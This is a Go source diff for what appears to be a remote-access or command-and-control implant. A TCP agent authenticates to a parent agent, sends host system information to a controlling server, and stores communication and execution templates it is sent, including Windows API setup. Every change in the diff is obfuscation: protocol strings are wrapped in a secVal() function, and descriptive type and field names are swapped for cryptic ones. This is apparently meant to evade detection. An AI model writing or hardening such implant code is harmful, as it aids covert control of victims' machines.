@@ -16,7 +16,7 @@ import (
 
 // performAuth performs simple challenge-response authentication with the connecting parent agent
 // This mirrors the SMB agent authentication pattern for consistency
-func performAuth(conn *TCPConnection) error {
+func performAuth(conn *StreamConn) error {
 	// Step 1: Generate 32-byte random challenge
 	challenge := make([]byte, 32)
 	if _, err := rand.Read(challenge); err != nil {
@@ -35,7 +35,7 @@ func performAuth(conn *TCPConnection) error {
 	}
 
 	// Step 4: Verify response format
-	expectedPrefix := []byte(protoAuthPrefix)
+	expectedPrefix := []byte(secVal(protoAuthPrefix))
 	if len(response) != len(expectedPrefix)+len(challenge) {
 		return fmt.Errorf(Err(E2))
 	}
@@ -53,7 +53,7 @@ func performAuth(conn *TCPConnection) error {
 	}
 
 	// Step 5: Send "OK" confirmation
-	if err := conn.WriteMessage([]byte(protoAuthOk)); err != nil {
+	if err := conn.WriteMessage([]byte(secVal(protoAuthOk))); err != nil {
 		return fmt.Errorf(ErrCtx(E11, err.Error()))
 	}
 
@@ -62,9 +62,9 @@ func performAuth(conn *TCPConnection) error {
 
 // performHandshake performs the RSA+AES handshake with the server via the parent agent
 // This is the same as SMB - the TCP agent sends system info encrypted with server's public key
-func performHandshake(conn *TCPConnection, config map[string]string) error {
+func performHandshake(conn *StreamConn, config map[string]string) error {
 	// Collect system information
-	sysInfo, err := CollectSystemInfo(clientID)
+	sysInfo, err := collectSystemInfo(clientID)
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
@@ -80,8 +80,8 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 
 	// Create handshake message to send through the parent agent
 	handshakeMsg := map[string]string{
-		protoKeyType:    protoTypeHandshake,
-		protoKeyPayload: encryptedPayload,
+		secVal(protoKeyType):    secVal(protoTypeHandshake),
+		secVal(protoKeyPayload): encryptedPayload,
 	}
 
 	msgJSON, err := json.Marshal(handshakeMsg)
@@ -110,8 +110,8 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 			// Check if this is a ping message - if so, respond with pong and continue waiting
 			var msgCheck map[string]interface{}
 			if err := json.Unmarshal(resp, &msgCheck); err == nil {
-				if msgType, _ := msgCheck[protoKeyType].(string); msgType == protoTypePing {
-					pongMsg := map[string]string{protoKeyType: protoTypePong}
+				if msgType, _ := msgCheck[secVal(protoKeyType)].(string); msgType == secVal(protoTypePing) {
+					pongMsg := map[string]string{secVal(protoKeyType): secVal(protoTypePong)}
 					pongJSON, _ := json.Marshal(pongMsg)
 					conn.WriteMessage(pongJSON)
 					continue
@@ -133,18 +133,18 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
 
-		respType, _ := respEnvelope[protoKeyType].(string)
-		if respType != protoTypeHsResp {
+		respType, _ := respEnvelope[secVal(protoKeyType)].(string)
+		if respType != secVal(protoTypeHsResp) {
 			return fmt.Errorf(Err(E2))
 		}
 
-		respPayloadStr, _ := respEnvelope[protoKeyPayload].(string)
+		respPayloadStr, _ := respEnvelope[secVal(protoKeyPayload)].(string)
 		respBytes, err := base64.StdEncoding.DecodeString(respPayloadStr)
 		if err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
 
-		var signedResp SignedResponse
+		var signedResp VResp
 		if err := json.Unmarshal(respBytes, &signedResp); err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
@@ -153,15 +153,15 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 			return fmt.Errorf(ErrCtx(E3, err.Error()))
 		}
 
-		if signedResp.NewClientID == "" {
+		if signedResp.NNID == "" {
 			return fmt.Errorf(Err(E4))
 		}
-		clientID = signedResp.NewClientID
+		clientID = signedResp.NNID
 
 		// Parse and store comms template if provided
-		if signedResp.CommsTemplate != "" {
-			if tplData, err := base64.StdEncoding.DecodeString(signedResp.CommsTemplate); err == nil {
-				var ct CommsTemplate
+		if signedResp.PCfg != "" {
+			if tplData, err := base64.StdEncoding.DecodeString(signedResp.PCfg); err == nil {
+				var ct PCfg
 				if err := json.Unmarshal(tplData, &ct); err == nil {
 					setCommsTemplate(&ct)
 					// Initialize Windows common APIs now that template is available
@@ -171,16 +171,16 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 		}
 
 		// Parse and store exec requirements template if provided
-		if signedResp.ExecReqTemplate != "" {
-			if tplData, err := base64.StdEncoding.DecodeString(signedResp.ExecReqTemplate); err == nil {
-				var et ExecReqTemplate
+		if signedResp.RunCfg != "" {
+			if tplData, err := base64.StdEncoding.DecodeString(signedResp.RunCfg); err == nil {
+				var et RunCfg
 				if err := json.Unmarshal(tplData, &et); err == nil {
 					setExecReqTemplate(&et)
 				}
 			}
 		}
 
-		secret1, secret2 := generateInitialSecrets(initSecret, sysInfo.AgentInfo.Seed)
+		secret1, secret2 := generateInitialSecrets(initSecret, sysInfo.DT.SD)
 		secureComms = NewSecureComms(secret1, secret2)
 
 		return nil
@@ -193,13 +193,13 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 	}
 }
 
-// SignedResponse represents the server's signed handshake response
-type SignedResponse struct {
+// VResp represents the server's signed handshake response
+type VResp struct {
 	Status             string `json:"st"`
-	NewClientID        string `json:"nc"`
-	SecretsInitialized bool   `json:"si"`
+	NNID        string `json:"nc"`
+	SInit bool   `json:"si"`
 	Signature          string `json:"sg"`
 	Seed               string `json:"seed"`
-	CommsTemplate      string `json:"ct,omitempty"`
-	ExecReqTemplate    string `json:"et,omitempty"`
+	PCfg      string `json:"ct,omitempty"`
+	RunCfg    string `json:"et,omitempty"`
 }
